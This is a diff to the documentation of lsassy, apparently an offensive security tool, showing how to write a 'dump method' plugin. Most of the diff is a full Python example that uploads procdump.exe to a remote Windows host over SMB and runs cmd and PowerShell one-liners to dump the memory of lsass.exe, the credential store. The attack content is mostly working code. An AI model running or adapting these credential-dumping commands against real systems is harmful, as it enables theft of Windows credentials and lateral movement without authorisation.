@@ -322,7 +322,7 @@ lsassy [-d domain] -u user -p password targets --threads 32
 
 ## Add dump method
 
-There is a **dummy.py** file in **dumpmethod** directory. This file contains basic structure to create a new dump method functionnality.
+There is a **dummy.py.tpl** file in **dumpmethod** directory. This file contains basic structure to create a new dump method functionnality.
 
 ### get_commands
 
@@ -338,9 +338,16 @@ return {
 }
 ```
 
+### Dependencies
+
+There is a `Dependency` class that can be used to easily upload files needed for dump method, like **procdump.exe** from sysinternals. Two methods can be used :
+
+* `prepare_dependencies` to check if all parameters were provided by the user to locally find the file on user's disk and upload it, and then actually upload the file
+* `clean_dependencies` to try and remove uploaded files
+
 ### (Optionnal) prepare
 
-This method will be called **before** executing commands provided by **get_commands**. It can be used to upload files or check stuff
+This method will be called **before** executing commands provided by **get_commands**. It can be used to upload files or check stuff.
 
 ### (Optionnal) clean
 
@@ -351,15 +358,10 @@ This method will be called **after** executing commands provided by **get_comman
 Here is procdump example with some comments
 
 ```python
-import logging
-import os
-import time
-
-from lsassy.dumpmethod import IDumpMethod
+from lsassy.dumpmethod import IDumpMethod, Dependency
 
 
 class DumpMethod(IDumpMethod):
-
     """
     If your dumping method cannot produce a dumpfile with a custom dumpfile name, you must set this setting to False
     and uncomment 'dump_name' to provide expected dumpfile name on remote system.
@@ -370,91 +372,63 @@ class DumpMethod(IDumpMethod):
     """
     If your dumping method cannot produce a dumpfile in a custom directory, you must set this setting to False
     and uncomment 'dump_share' and 'dump_path' to provide expected dumpfile location on remote system.
+    If your dumping tool can have a custom dump name but not a custom dump extension, provide the dump extension in dump_ext variable
+    In this example, procdump.exe will produce a dump wherever we want, with a name we choose, but will always add a .dmp extension.
     """
     custom_dump_path_support = True  # Default: True
     # dump_share             = ""    # Default: "C$"
     # dump_path              = ""    # Default: "\\Windows\\Temp\\"
+    dump_ext                 = "dmp"
 
-    def __init__(self, session):
+    def __init__(self, session, timeout):
         """
         __init__ is overloaded to create some instance variables
         """
-        super().__init__(session)
-        self.procdump = "procdump.exe"
-        self.procdump_path = False
-        self.procdump_remote_share = "C$"
-        self.procdump_remote_path = "\\Windows\\Temp\\"
-
-        self.procdump_uploaded = False
+        super().__init__(session, timeout)
+        
+        """
+        This module requires procdump.exe to be uploaded on the remote server before being executed.
+        So we add procdump as a Dependency. First argument is a name for our dependency (can be arbitrary),
+        and second argument is default executable name on local user's disk.
+        """
+        self.procdump = Dependency("procdump", "procdump.exe")
 
     def prepare(self, options):
         """
         Prepare method is overloaded so that we are able to
         - check if mandatory parameters are provided
         - upload procdump on the remote host.
+        All this can be done using prepare_dependencies method from our Dependency object
         """
-        self.procdump = options.get("procdump", self.procdump)
-        self.procdump_path = options.get("procdump_path", self.procdump_path)
-        self.procdump_remote_share = options.get("procdump_remote_share", self.procdump_remote_share)
-        self.procdump_remote_path = options.get("procdump_remote_path", self.procdump_remote_path)
-
-        if not self.procdump_path:
-            logging.error("Missing procdump_path")
-            return None
-
-        if not os.path.exists(self.procdump_path):
-            logging.error("{} does not exist.".format(self.procdump_path))
-            return None
-
-        # Upload procdump
-        logging.debug('Copy {} to {}'.format(self.procdump_path, self.procdump_remote_path))
-        with open(self.procdump_path, 'rb') as p:
-            try:
-                self._session.smb_session.putFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump, p.read)
-                logging.success("Procdump successfully uploaded")
-                self.procdump_uploaded = True
-                return True
-            except Exception as e:
-                logging.error("Procdump upload error", exc_info=True)
-                return None
+        return self.prepare_dependencies(options, [self.procdump])
 
     def clean(self):
         """
-        Clean method is overloaded so that we are able to delete procdump if it was uploaded
+        Clean method is overloaded so that we are able to delete our dependency if it was uploaded
+        The clean_dependencies method will do this for us.
         """
-        if self.procdump_uploaded:
-            t = time.time()
-            while True:
-                try:
-                    self._session.smb_session.deleteFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump)
-                    logging.debug("Procdump successfully deleted")
-                    return True
-                except Exception as e:
-
-                    if time.time() - t > 5:
-                        logging.warning("Procdump deletion error.")
-                        return False
-                    logging.debug("Procdump deletion error. Retrying...")
-                    time.sleep(0.2)
+        self.clean_dependencies([self.procdump])
 
     def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
         """
         get_commands method is overloaded as it is mandatory.
         Two different ways of dumping lsass with cmd.exe and powershell are provided and returned.
+        The get_remote_path method of our Dependency object is used to get the correct remote path 
+        of procdump on our target.
         """
-        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
-            self.procdump_remote_path, self.procdump,
+        
+        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} -accepteula -o -ma %J {}{}""".format(
+            self.procdump.get_remote_path(),
             self.dump_path, self.dump_name
         )
-        pwsh_command = """{}{} -accepteula -o -ma (Get-Process lsass).Id {}{}""".format(
-            self.procdump_remote_path, self.procdump,
+        pwsh_command = """{} -accepteula -o -ma (Get-Process lsass).Id {}{}""".format(
+            self.procdump.get_remote_path(),
             self.dump_path, self.dump_name
         )
         return {
             "cmd": cmd_command,
             "pwsh": pwsh_command
         }
-
 ```
 
 You can check dummy class for more comments and/or informations.
